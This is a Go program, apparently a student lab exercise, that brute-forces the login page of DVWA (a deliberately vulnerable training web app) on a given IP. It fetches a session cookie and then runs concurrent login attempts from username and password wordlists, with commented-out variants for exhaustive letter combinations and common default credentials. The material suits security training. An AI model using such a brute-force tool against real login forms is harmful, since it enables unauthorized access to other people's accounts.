package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"sync"
	"time"

	"dvwa_prakt3/taskSolution"
)

func generateSequences(alphabet string, n int, current string, sequences chan<- string) {

	if n == 0 {
		sequences <- current
		return
	}

	for _, char := range alphabet {
		generateSequences(alphabet, n-1, current+string(char), sequences)
	}

	if current == "" {
		close(sequences)
	}
}

func parallelBruteforceByGenerator(alphabet string, resourceURL string, cookieValue string, wg *sync.WaitGroup, sem chan struct{}) {

	for n := 1; n < 9; n++ {
		strings1 := make(chan string)
		strings2 := make(chan string)

		go generateSequences(alphabet, n, "", strings1)
		go generateSequences(alphabet, n, "", strings2)

		for s1 := range strings1 {
			for s2 := range strings2 {
				time.Sleep(100 * time.Microsecond)

				wg.Add(1)
				go taskSolution.TrySolveTask(resourceURL, cookieValue, s1, s2, wg, sem)

			}
		}

	}
}

func parallelBruteforceByList(alphabet string, resourceURL string, cookieValue string, usernames []string, passwords []string, wg *sync.WaitGroup, sem chan struct{}) {
	for _, s1 := range usernames {
		for _, s2 := range passwords {
			time.Sleep(100 * time.Microsecond)

			wg.Add(1)
			go taskSolution.TrySolveTask(resourceURL, cookieValue, s1, s2, wg, sem)
		}
	}
}

func readLines(filename string) ([]string, error) {
	var lines []string
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return lines, nil
}

func main() {
	ip := flag.String("ip", "", "IP-адрес виртуальной машины")
	user := flag.String("user", "", "Логин")
	pass := flag.String("pass", "", "Пароль")

	flag.Parse()

	if *ip == "" || *user == "" || *pass == "" {
		fmt.Println("Необходимо указать все аргументы: --ip, --user, --pass")
		return
	}
	var wg sync.WaitGroup
	sem := make(chan struct{}, 50)

	// taskResourceURL := "http://192.168.55.36/DVWA/vulnerabilities/brute/"
	// loginResourceURL := "http://192.168.55.36/DVWA/login.php"

	taskResourceURL := fmt.Sprintf("http://%s/DVWA/vulnerabilities/brute/", *ip)
	loginResourceURL := fmt.Sprintf("http://%s/DVWA/login.php", *ip)

	masterUsername := *user
	masterPasword := *pass

	cookieValue := taskSolution.GetSessionToken(loginResourceURL, masterUsername, masterPasword)

	// usernames := [...]string{"user", "username", "admin", "root", "test", "1"}
	// passwords := [...]string{"user", "username", "admin", "root", "test", "password"}

	// for _, username := range usernames {
	// 	for _, password := range passwords {
	// 		wg.Add(1)
	// 		go taskSolution.TrySolveTask(taskResourceURL, cookieValue, username, password, &wg)

	// 	}
	// }

	// const symbols = "abcdefghijklmnopqrstuvwxyz"
	// parallelBruteforceByGenerator(symbols, taskResourceURL, cookieValue, &wg, sem)

	usernames, err := readLines("namelist.txt")
	if err != nil {
		panic(err)
	}

	passwords, err := readLines("password.txt")
	if err != nil {
		panic(err)
	}

	parallelBruteforceByList("abcdefghijklmnopqrstuvwxyz", taskResourceURL, cookieValue, usernames, passwords, &wg, sem)

	wg.Wait()
}
